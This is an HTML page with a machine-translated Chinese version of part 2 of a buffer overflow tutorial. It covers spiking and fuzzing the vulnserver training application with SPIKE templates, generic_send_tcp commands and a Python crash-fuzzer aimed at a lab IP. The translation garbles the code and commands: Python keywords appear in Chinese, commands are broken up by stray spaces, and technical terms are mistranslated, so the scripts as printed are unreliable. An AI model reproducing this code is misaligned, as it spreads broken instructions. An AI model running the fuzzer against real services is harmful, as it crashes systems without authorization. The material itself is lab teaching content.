<html>
<head>
<title>Buffer overflow tutorial (part 2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">缓冲区溢出教程(第2部分)</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/buffer-overflow-tutorial-part2-c21c6de5c11c?source=collection_archive---------2-----------------------#2020-07-07">https://blog.devgenius.io/buffer-overflow-tutorial-part2-c21c6de5c11c?source=collection_archive---------2-----------------------#2020-07-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/9ecf2131d8ac4251c66c30c182e90282.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3Ehi3odcfj8oWTXpR9fPmg.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">安加德·辛格·www.officialhacker.com</figcaption></figure><h1 id="9183" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">2 — <strong class="ak">利用缓冲区溢出</strong></h1><p id="d1c5" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">在本教程中，我们将针对名为<em class="ly">“vulnserver”的易受攻击软件</em>这是一个基于Windows的线程化TCP服务器应用程序，专为开发目的而设计。该产品主要是作为学习如何发现和使用缓冲区溢出错误的工具。它包含的每一个缺陷相对于其他缺陷来说都是不明显的，在编写漏洞利用时需要稍微不同的方法来处理。要下载这个软件，请访问以下网页:<em class="ly"/><a class="ae lz" href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html" rel="noopener ugc nofollow" target="_blank"><em class="ly">http://www . the grey corner . com/2010/12/introducing-vulnserver . html</em></a><em class="ly">。</em>从页面底部，点击<em class="ly">“vulnserver . zip”</em>文件。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ma"><img src="../Images/f26a384f35b74e744cf4ef02cc75c1b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x-_JH37kb2aMpxq_qGMhnw.jpeg"/></div></div></figure><p id="2536" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">导航到<em class="ly">“Downloads”</em>文件夹，提取Zip文件。找到<em class="ly"> "vulnserver.exe" </em>可执行文件，并以管理员身份运行。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/6a47b097545ae752375f1f53c9c2710e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jdxXMXDXQZnmWD57ky573w.jpeg"/></div></div></figure><p id="ac5a" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">“vulnserver”</em>将启动活动会话并等待传入的连接。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ml"><img src="../Images/d869261b4930cba96c9b806404eff23d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9FGMRzMGwj9hcbxKH0t8bQ.jpeg"/></div></div></figure><p id="67ef" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">我们需要下载的另一个重要工具叫做<em class="ly">“免疫调试器”</em>当你需要编写漏洞、分析恶意软件和逆向工程Win32二进制文件时，这是一个值得拥有的简单应用程序。</p><p id="dcc6" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">该软件带有直观的图形界面和命令行。要下载免疫调试器，请访问<em class="ly"/><a class="ae lz" href="https://www.immunityinc.com/products/debugger/" rel="noopener ugc nofollow" target="_blank"><em class="ly">https://www.immunityinc.com/products/debugger/</em></a><em class="ly"/>网站，并点击<em class="ly">“在此下载免疫调试器！”</em>链接。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/73bf72f26d66962230d8d69e846f9b9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wQjtX_wGrYppkbPGszVlBg.jpeg"/></div></div></figure><p id="c3de" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">安装软件后，以管理员身份运行它。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/f3d00d2b1633dacd98a6a841f908b1ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GJieJ1iw9pBoDfQV1Ohuhw.jpeg"/></div></div></figure><p id="b61c" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">从免疫调试器主窗口，点击<em class="ly">“文件”</em>选项卡，并选择<em class="ly">“附加”</em>选项。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/5abc83d835e94a3807714bbe79aee778.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HT9ddrBBS71WZLsZwIHJTw.jpeg"/></div></div></figure><p id="f7dd" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">将弹出一个小窗口，要求您选择要检查的特定过程。从该窗口中，找到<em class="ly"> "vulnserver" </em>进程，并点击<em class="ly"> "Attach" </em>按钮。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mp"><img src="../Images/9d6266eb152c7f5cee811e85a5cecefe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YBYNLjLDWsQo3o1d4P4-2A.jpeg"/></div></div></figure><p id="89e8" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">它会将易受攻击软件的运行过程嵌入调试器界面。要开始运行调试器，请单击播放按钮。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/62dc3a0d28e3a67bb4b785dcafc63c54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cx5QlaaQE1c9wyebtlYnKA.jpeg"/></div></div></figure><h1 id="5934" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">3 — <strong class="ak">扣球</strong></h1><p id="995b" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">斯派克是卡利分布的一部分。这是一个程序，发送创建的软件包到一个应用程序，使其崩溃。Spike既可以发送TCP包，也可以发送UDP包，在Spike的辅助下，我们可以发现应用程序中的漏洞。在这一部分，我们将演示如何使用斯派克来对付<em class="ly">“攻击服务器”</em></p><p id="8641" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">在Windows机器上启动<em class="ly">“vulnserver”</em>，在Kali Linux上用<em class="ly">“netcat”连接<em class="ly">“vulnserver”</em></em>默认情况下，<em class="ly">“vulnserver”</em>运行在端口9999上。</p><p id="e748" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ # NC-NV 10 . 10 . 10 . 4 9999)。</em></p><p id="e62d" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">然后<em class="ly"> </em>键入<em class="ly">【帮助】</em>列出可用的命令。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/3ae312aa6d270ffe95f5d5767821d3ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*94Um1IUuRkupqNjtCA6seA.jpeg"/></div></div></figure><p id="1e77" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">要发送TCP包，我们使用<em class="ly">“generic _ send _ TCP”</em>命令。使用该命令的正确形式如下:<em class="ly"> (generic_send_tcp &lt; IP地址&gt; &lt;端口号&gt;&lt;spike _ script&gt;&lt;skip var&gt;&lt;skip str&gt;)。</em></p><p id="73f2" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ # generic _ send _ TCP)。</em></p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/e6dd5529d91bd07df6195268448ce882.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_Wi3bgZUQwUDYn_WvFB3xw.jpeg"/></div></div></figure><p id="e29f" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">在模板包含多个变量的情况下，如果我们为<em class="ly">“skip var”指定不同的值，我们可以测试每个变量在我们的例子中，这总是零。Spike用交替的字符串代替变量来发送包。如果我们为<em class="ly">“skip str”指定一个值，我们可以从测试中的一个特定点开始</em>如果该值为零，那么Spike从头开始。</em></p><p id="3a07" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">尖峰脚本描绘了通信的包配置。这样我们就可以告诉斯派克，应该先测试哪些参数。我们需要检查<em class="ly">“vulnserver”</em>中的每一个命令，看看是否能让它崩溃。</p><p id="305a" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">例如，下面的模板将尝试发送带有各种参数的<em class="ly"> "STATS" </em>命令。</p><p id="e720" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">打开文本编辑器，键入下面几行来测试<em class="ly"> "STATS" </em>命令，并将其保存为<em class="ly"> "stats.spk" </em>文件。</p><p id="852e" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">s _ readline()；</em></p><p id="a32e" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">s _ string(" STATS ")；</em></p><p id="bfeb" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">s _ string _ variable(" 0 ")；</em></p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mt"><img src="../Images/40e9b825d06a85738aaf2e4dad537896.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BgKjMipDXW-laU0BsbBtMg.jpeg"/></div></div></figure><p id="0e58" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">现在我们已经准备好发送我们的第一个包裹了。当我们的调试器运行时，使用我们创建的spike脚本键入以下命令来测试<em class="ly"> "STATS" </em>参数。</p><p id="937b" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ # generic _ send _ TCP 10 . 10 . 10 . 4 9999 stats . spk 0)。</em></p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mu"><img src="../Images/8fecb3da9cb3f2782df7fb40c1ce0b22.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GD0br8a2YfomqEX0O-ifFA.jpeg"/></div></div></figure><p id="8842" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">观察免疫调试器，并等到应用程序崩溃。如果在一分钟左右的时间内它没有崩溃，停止使用<em class="ly">“STATS”</em>参数，尝试其他命令。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/e04b0b27a6d72aa9fa75450371ec2888.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iwqIM307SS-3T6ckQ6m8Qw.jpeg"/></div></div></figure><p id="7a09" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">出于时间考虑，我们对其中一些进行了测试，发现<em class="ly">【TRUN】</em>参数易受攻击，几秒钟内就崩溃了。打开文本编辑器，输入以下行来测试<em class="ly"> "TRUN" </em>命令，并将其保存为<em class="ly"> "trun.spk" </em>文件。</p><p id="45f3" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">s _ readline()；</em></p><p id="4c72" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">s _ string(" TRUN ")；</em></p><p id="f389" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">s _ string _ variable(" 0 ")；</em></p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mv"><img src="../Images/56aecc747ab4a491abec1e54fc059d6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4i4TpdATs17KMAXF-RY5yQ.jpeg"/></div></div></figure><p id="b4fe" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">在我们开始发送包裹之前，我们必须设置环境。首先以管理员身份在Windows机器上运行<em class="ly">“vulnserver”</em>和Immunity调试器。然后将<em class="ly">“vulnserver”</em>运行进程附加到Immunity，运行调试器。</p><p id="b53a" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">现在我们可以发送TCP包来秒杀<em class="ly">“vulnserver”</em>，让它崩溃。</p><p id="ed93" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ # generic _ send _ TCP 10 . 10 . 10 . 4 9999 trun . spk 0)。</em></p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/e8aeb919e81707d4bcd1a3b3a52ff5af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3mOR9uAXHt4COW0dTOnJrw.jpeg"/></div></div></figure><p id="e655" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">在几秒钟内，我们可以看到免疫性调试器已经暂停，并且发生了访问冲突。这意味着我们已经覆盖了内存中的<em class="ly">【EIP】【EBP】</em><em class="ly">【ESP】</em>部分，从现在开始可以执行任何缓冲区溢出了。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/8aba267c07dbd2d70194f0c5daf5b96b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AaQpuiPhNv5s2oDkX6rm5Q.jpeg"/></div></div></figure><h1 id="896d" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">4 —起毛</h1><p id="febb" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">fuzzing方法非常类似于spiking，因为我们将在一个特定的命令中发送多个字符，并试图使其崩溃。不同的是，对于尖峰信号，我们试图对各种参数进行测试，以找出哪些是易受攻击的。既然我们知道<em class="ly">“TRUN”</em>参数配置不正确，我们将专门攻击该命令。</p><p id="2593" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">在我们开始模糊化<em class="ly">“vulnserver”</em>之前，我们必须设置环境。首先以管理员身份在Windows机器上运行<em class="ly">“vulnserver”</em>和Immunity调试器。然后将<em class="ly">“vulnserver”</em>运行进程附加到Immunity，运行调试器。</p><p id="9bc9" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">运行您最喜欢的文本编辑器，键入以下几行:</p><p id="4e2e" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">—————</em></p><p id="07ed" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> #！/usr/bin/python </em></p><p id="76ae" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">导入系统，插座</em></p><p id="e1d8" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">从时间导入睡眠</em></p><p id="53db" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> buffer = "A" * 100 </em></p><p id="23b9" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">为真时:</em></p><p id="d9cc" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">试试:</em></p><p id="3532" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> s = socket.socket(套接字。AF_INET，socket。SOCK_STREAM) </em></p><p id="9f16" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> s.connect(('10.10.10.4 '，9999)) </em></p><p id="b6bf" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> s.send(('TRUN /。:/' + buffer)) </em></p><p id="e01c" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> s.close() </em></p><p id="300d" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">睡眠(1) </em></p><p id="f923" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> buffer = buffer + "A" * 100 </em></p><p id="a4b7" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">除了:</em></p><p id="4495" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">打印“在%s字节“% str(len(buffer))”时模糊崩溃</em></p><p id="c8e2" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly"> sys.exit() </em></p><p id="1aa8" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><em class="ly">—————</em></p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi my"><img src="../Images/10046ca430e031708a2d866a9a0a3808.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s7wSerO5DhIXLqgVpgtTfw.jpeg"/></div></div></figure><p id="43cf" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">完成后，将其保存为<em class="ly"> "Fuzzing1.py" </em>，并将mod更改为可执行文件。</p><p id="683c" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ # chmod+x fuzz ing1 . py)。</em></p><p id="aea4" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">因此，我们告诉python脚本运行特定的模块并连接到我们的Windows机器，该机器位于10.10.10.4中的端口9999上。然后，我们将发送一个易受攻击的<em class="ly"> "TRUN" </em>命令，向它附加100个<em class="ly"> "A" </em>字符，这将继续下去，直到它崩溃。</p><p id="3c6d" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">让我们运行python脚本并监控免疫调试器。</p><p id="9f8f" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ #。/Fuzzing1.py)。</em></p><p id="a85f" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated">一旦它崩溃，终止脚本并记录崩溃位置的大概字节大小。在我们的例子中，它发生在2200字节。</p><figure class="mb mc md me gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/bba2c5afde69034e0ccf544cc7095ae4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OH0FFQ85OYfMIs9uqfiN7w.jpeg"/></div></div></figure></div><div class="ab cl na nb hu nc" role="separator"><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf ng"/><span class="nd bw bk ne nf"/></div><div class="ij ik il im in"><p id="07a3" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part1-efc6b9f3e4ee" rel="noopener">缓冲区溢出教程(第一部分)</a></p><p id="b53e" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part2-c21c6de5c11c" rel="noopener">缓冲区溢出教程(第二部分)</a></p><p id="e9d0" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part3-98ab394073e3" rel="noopener">缓冲区溢出教程(第三部分)</a></p><p id="941a" class="pw-post-body-paragraph la lb iq lc b ld mf lf lg lh mg lj lk ll mh ln lo lp mi lr ls lt mj lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/dev-genius/buffer-overflow-tutorial-part4-1e80e90a2f03" rel="noopener">缓冲区溢出教程(第四部分)</a></p></div></div>    
</body>
</html>